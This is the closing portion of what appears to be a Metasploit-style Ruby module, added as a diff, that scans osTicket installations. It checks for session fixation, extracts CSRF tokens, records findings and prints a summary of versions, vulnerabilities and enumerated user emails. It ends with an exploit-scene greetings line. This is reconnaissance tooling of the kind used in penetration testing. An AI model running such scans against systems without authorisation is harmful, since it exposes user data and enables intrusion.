+  def test_session_fixation
+
+    test_cookie = "TEST_SESSION_ID=#{Rex::Text.rand_text_alphanumeric(32)}"
+    
+    res1 = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(@intel[:base_path], '/'),
+      'headers' => { 'Cookie' => test_cookie }
+    })
+    
+    res2 = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(@intel[:base_path], 'login.php'),
+      'headers' => { 'Cookie' => test_cookie }
+    })
+    
+    {
+      vulnerable: (res1 && res2 && res1.headers['Set-Cookie'] == res2.headers['Set-Cookie']),
+      details: 'Session ID not regenerated on login'
+    }
+  end
+
+  def extract_csrf_token(html)
+    patterns = [
+      /name=["']__CSRFToken__["'][^>]*value=["']([^"']+)["']/i,
+      /<meta[^>]*csrf-token[^>]*content=["']([^"']+)["']/i,
+      /csrf.*token.*value=["']([^"']+)["']/i,
+      /<input[^>]*type=["']hidden["'][^>]*name=["']token["'][^>]*value=["']([^"']+)["']/i
+    ]
+    
+    patterns.each do |pattern|
+      match = html.match(pattern)
+      return match[1] if match
+    end
+    
+    nil
+  end
+
+  def store_intelligence
+
+    report_note(
+      host: @intel[:host],
+      port: @intel[:port],
+      ssl: @intel[:ssl],
+      type: 'osticket.intelligence',
+      data: @intel.reject { |k,v| [:host, :port, :ssl].include?(k) }
+    )
+
+    @intel[:vulnerabilities].each do |vuln|
+      report_vuln(
+        host: @intel[:host],
+        port: @intel[:port],
+        ssl: @intel[:ssl],
+        name: vuln[:type],
+        info: "Module: #{module_fullname}, Details: #{vuln.inspect}",
+        refs: references,
+        exploited_at: Time.now.utc
+      )
+    end
+
+    if @intel[:users] && !@intel[:users].empty?
+      report_note(
+        host: @intel[:host],
+        port: @intel[:port],
+        ssl: @intel[:ssl],
+        type: 'osticket.discovered_users',
+        data: { users: @intel[:users], count: @intel[:users].length }
+      )
+    end
+  end
+
+  def print_summary
+    print_line("\n" + "=" * 80)
+    print_status("osTicket Intelligence Summary for #{@intel[:host]}:#{@intel[:port]}")
+    print_line("-" * 80)
+    
+    if @intel[:version] && @intel[:version][:detected] != 'unknown'
+      print_status("Version: #{@intel[:version][:detected]} (confidence: #{@intel[:version][:confidence]}%)")
+    end
+    
+    if @intel[:vulnerabilities] && !@intel[:vulnerabilities].empty?
+      print_warning("Vulnerabilities found: #{@intel[:vulnerabilities].length}")
+      @intel[:vulnerabilities].each do |vuln|
+        severity_color = vuln[:severity] == 'high' ? '%red' : '%yel'
+        print_line("  • #{severity_color}#{vuln[:type].upcase}%clr (#{vuln[:severity]}) - #{vuln[:details] || vuln[:payload] || vuln[:endpoint] || 'N/A'}")
+      end
+    else
+      print_good("No critical vulnerabilities detected")
+    end
+    
+    if @intel[:findings] && !@intel[:findings].empty?
+      print_status("Security findings: #{@intel[:findings].length}")
+      @intel[:findings].first(5).each do |finding|
+        print_line("  • #{finding}")
+      end
+      print_line("  ... (showing 5 of #{@intel[:findings].length})") if @intel[:findings].length > 5
+    end
+    
+    if @intel[:users] && !@intel[:users].empty?
+      print_status("Discovered users: #{@intel[:users].length}")
+      @intel[:users].first(5).each do |user|
+        print_line("  • #{user[:email]}")
+      end
+      print_line("  ... (showing 5 of #{@intel[:users].length})") if @intel[:users].length > 5
+    end
+
+    if @intel[:endpoints] && !@intel[:endpoints].empty?
+      accessible = @intel[:endpoints].count { |_, v| v[:status] == 200 }
+      sensitive = @intel[:endpoints].count { |_, v| v[:sensitive] == true }
+      print_status("Endpoints: #{@intel[:endpoints].length} total, #{accessible} accessible, #{sensitive} sensitive")
+    end
+    
+    print_line("=" * 80)
+  end
+
+  def perform_fingerprinting
+    fingerprint_version
+    analyze_headers
+    check_endpoints
+  end
+  
+  def perform_auth_analysis
+    analyze_auth_mechanisms
+  end
+  
+  def perform_user_enumeration
+    enumerate_users_if_possible
+  end
+  
+  def perform_configuration_check
+    check_endpoints
+    analyze_session_management
+    analyze_headers
+  end
+end
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
